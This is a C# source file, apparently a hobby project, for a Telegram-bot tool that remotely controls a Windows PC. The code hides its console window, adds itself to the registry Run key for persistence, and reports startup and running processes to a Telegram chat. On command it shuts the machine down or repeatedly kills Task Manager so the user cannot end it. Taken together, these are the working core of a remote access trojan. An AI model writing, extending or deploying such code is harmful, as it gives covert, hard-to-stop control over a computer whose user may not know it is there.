using ControlPCinTelegram;
using Microsoft.Win32;
using System.Diagnostics;
using Telegram.Bot;
using Telegram.Bot.Types;

#region User_Parameters
const string tokenBot = "";//Token bot Telegram
const int chatIdClient = ; //user chat Id 
#endregion

#region App_Parameters
Settings settings = new Settings();
string versApp = "0.1";
#endregion

#region TelegramBot_Settings
var botClient = new TelegramBotClient(tokenBot);
botClient.StartReceiving(Updating, Error);
#endregion

#region Main
if (!settings.isFirstSettings)
{
    if (settings.isAutoStart)
        AddAutoStart();
    if (settings.isBlockTaskManager)
        BlockTaskManager();    
}
var handle = NativeMethods.GetConsoleWindow();
NativeMethods.ShowWindow(handle, NativeMethods.SW_HIDE);

await botClient.SendTextMessageAsync(chatIdClient, $"I am back\nVersApp: {versApp}"); // send message about start system
Console.ReadLine();
#endregion

#region MessageProcessing
async Task Updating(ITelegramBotClient client, Update update, CancellationToken token)
{
    var message = update.Message;
    if (chatIdClient == message.Chat.Id)
    {
        if (message.Text != null)
        {
            switch (message.Text)
            {
                case @"\vers App":
                    await client.SendTextMessageAsync(message.Chat.Id, $"VersApp: {versApp}");
                    break;
                case @"\stop work PC":
                    await client.SendTextMessageAsync(message.Chat.Id, "I’ll be back");
                    Process.Start("shutdown", "/s /t 0");
                    break;
                case @"\check autostart":
                    await client.SendTextMessageAsync(message.Chat.Id, "Автозапуск:" + settings.isAutoStart);
                    break;
                case @"\block Task Manager":
                    if (!settings.isBlockTaskManager)
                    {
                        settings.isBlockTaskManager = true;
                        BlockTaskManager();
                    }
                    break;
                case @"\unblock Task Manager":
                    settings.isBlockTaskManager = false;
                    break;
                case @"\list processes":
                    string s = "";
                    foreach (var item in ProcessesOfRunningApplications())
                    {
                        s = s + "\n" + item.ProcessName;
                    }
                    await client.SendTextMessageAsync(message.Chat.Id, "Запущенные процессы:" + s);
                    break;                    
                default:
                    break;
            }
        }
    }
    else await client.SendTextMessageAsync(message.Chat.Id, $"You chat Id: {message.Chat.Id}");
    
}

Task Error(ITelegramBotClient client, Exception exception, CancellationToken token) => client.SendTextMessageAsync(chatIdClient, exception.ToString());//throw new NotImplementedException();
#endregion

#region WorkWithProcesses
List<Process> ProcessesOfRunningApplications() => Process.GetProcesses().Where(p => p.MainWindowHandle != IntPtr.Zero).ToList();
#endregion

#region BlockingProgramShutdown
async void BlockTaskManager()
{
    while (settings.isBlockTaskManager)
    {
        Process[] taskManagers = Process.GetProcessesByName("Taskmgr");

        if (Process.GetProcessesByName("Taskmgr").Length != 0)
        {            
            foreach (var item in taskManagers)
            {
                item.Kill();
            }
            await Task.Delay(200);
        }
    }    
}
#endregion

#region AutoStart
async void AddAutoStart() // Добавление программы в автозапуск 
{
    // Получаем имя исполняемого файла без пути
    string appName = Path.GetFileNameWithoutExtension(System.AppDomain.CurrentDomain.FriendlyName);

    // Получаем ключ реестра для автозапуска текущего пользователя
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

    try
    {
        // Добавляем запись в автозапуск
        registryKey.SetValue(appName, System.Reflection.Assembly.GetExecutingAssembly().Location);
        settings.isAutoStart = true;
    }
    catch (Exception ex)
    {
        settings.isAutoStart = false;
        await botClient.SendTextMessageAsync(chatIdClient, "Error add autostart");
    }
    finally
    {
        registryKey.Close();
    }
}
#endregion

#region HidingWorkProgram
class NativeMethods
{
    public static int SW_HIDE = 0;
    [System.Runtime.InteropServices.DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
}
#endregion